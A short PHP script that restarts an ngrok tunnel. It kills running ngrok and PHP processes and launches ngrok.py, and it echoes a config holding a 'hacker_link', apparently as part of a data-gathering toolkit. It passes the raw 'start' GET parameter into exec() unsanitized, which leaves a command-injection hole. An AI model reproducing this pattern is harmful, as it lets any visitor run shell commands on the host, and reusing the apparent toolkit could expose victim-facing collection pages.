<?php
    $temp = $_GET['start'];
    if(isset($temp)){
   
        $filecontent=file_get_contents("getdata/config.json");
        $array = json_decode($filecontent,true);
        $last_kill = ($array["php_pid"]);
        $phpkill = ($array["php_pid"]);
        $ngrok_kill = ($array["ngrok_pid"]);
        if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') {
            exec("taskkill /f /im ngrok*");
            exec("taskkill /pid $last_kill /f" );
            exec("python3 ngrok.py ".$temp);
            

            $filecontent=file_get_contents("getdata/config.json");
            $array = json_decode($filecontent,true);

            $php_pid = ($array["php_pid"]);
            $ngrok_link = ($array["hacker_link"]);
            $ngrok_pid = ($array["ngrok_pid"]);

            echo($filecontent);
        }   
        elseif(PHP_OS == "Linux"){
            exec("killall ngrok");
            exec("kill -9 $last_kill" );
            exec("python3 ngrok.py ".$temp);
            

            $filecontent=file_get_contents("getdata/config.json");
            $array = json_decode($filecontent,true);

            $php_pid = ($array["php_pid"]);
            $ngrok_link = ($array["hacker_link"]);
            $ngrok_pid = ($array["ngrok_pid"]);

            echo($filecontent);

        }
    }




  
    
    // exec("python ngrok.py > getdata.txt");
?>